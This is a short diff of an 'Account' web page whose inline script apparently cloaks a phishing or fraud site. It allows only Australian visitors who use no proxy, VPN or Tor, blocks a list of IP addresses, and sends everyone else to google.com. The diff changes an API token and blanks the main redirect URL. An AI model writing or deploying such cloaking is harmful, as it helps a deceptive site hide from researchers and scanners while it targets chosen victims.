@@ -6,7 +6,7 @@
   <title>Account</title>
   <script>
     const allowedCountry = 'AU';
-    const token = "2577b075ce6917";
+    const token = "2cf2c3841c01a9";
 
     const blockedIPs = [
   "103.17.196.155", "104.210.79.75", "104.28.108.0", "104.28.125.4", "104.28.35.3",
@@ -92,7 +92,7 @@
         const isTor = privacyData.tor;
 
         if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
-          window.location.href = "https://www.ovh.de";
+          window.location.href = "";
         } else {
           window.location.href = "https://google.com";
         }
